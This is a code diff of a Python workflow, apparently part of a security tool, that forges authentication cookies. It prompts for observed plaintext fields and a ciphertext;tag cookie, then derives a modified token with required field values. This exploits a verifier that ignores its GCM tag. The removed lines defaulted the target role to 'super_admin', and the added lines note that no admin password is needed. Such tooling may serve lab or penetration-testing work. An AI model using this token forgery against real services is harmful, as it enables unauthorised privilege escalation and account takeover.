@@ -200,33 +200,34 @@ def source_verified_token_workflow(
     read: Callable[[str], str] = input,
     write: Callable[[str], Any] = print,
 ) -> None:
-    """Collect only values required by a source-verified token layout."""
-    from .cookie import alter_cookie
+    """Derive a minimal token solely from source-required JSON fields."""
+    from .cookie import transform_json_cookie
 
     write(f"Builder: {recipe.build.path}:{recipe.build.line} ({recipe.build.function})")
     write(f"Verifier: {recipe.verify.path}:{recipe.verify.line} ({recipe.verify.function})")
-    write(f"Observed source format: {recipe.format}; plaintext fields: {', '.join(recipe.fields)}")
+    write(f"Source format: {recipe.format}")
+    write("Builder plaintext fields: " + ", ".join(recipe.fields))
+    write("Verifier-required fields: " + ", ".join(recipe.required_fields))
+    write("Verifier constraints: " + ", ".join(
+        f"{name} == {value!r}" for name, value in recipe.required_values
+    ))
     if recipe.cookie_name:
         write(f"Cookie name in source: {recipe.cookie_name}")
-    write("Password is NOT a token plaintext field in this recognized source path.")
-    write("The verifier does not consume its authentication result. The retained tag will be invalid.")
-    if recipe.fields != ("username", "role"):
-        write("No matching built-in calculator for this serialization; inspect the source.")
-        return
-    username = _ask("Observed username (exact): ", read)
-    role = _ask("Observed role (exact): ", read)
-    cookie = _ask("Observed auth cookie only (ct_hex;tag_hex): ", read)
-    new_role = _ask("Desired role [super_admin]: ", read) or "super_admin"
-    new_username = _ask("Desired username (blank = adjust length automatically): ", read) or None
+    write("Only observed builder fields and a cookie are needed; no admin password or username.")
+    write("WARNING: authentication tag will be invalid and is retained only because the verifier ignores it.")
+    known_values = {
+        name: _ask(f"Observed {name} (exact): ", read) for name in recipe.fields
+    }
+    cookie = _ask("Observed cookie value (ciphertext_hex;tag_hex): ", read)
+    required = dict(recipe.required_values)
     try:
-        token, actual_username = alter_cookie(cookie, username, role, new_role, new_username)
+        token, plaintext = transform_json_cookie(cookie, known_values, required)
     except ValueError as exc:
         write("Cannot derive token from current evidence: " + str(exc))
-        write("Use a longer legitimate known plaintext/cookie pair or inspect the implementation.")
         return
-    write("Derived username: " + actual_username)
+    write("Minimal plaintext: " + plaintext.decode("utf-8"))
     write("Candidate cookie: " + token)
-    write("This result requires the demonstrated source behavior; it is not a valid GCM-authenticated token.")
+    write("Locally derived, NOT remotely verified. The MAC/tag is invalid for modified ciphertext.")
 
 
 def _show_finding(finding: Any, write: Callable[[str], Any]) -> None:
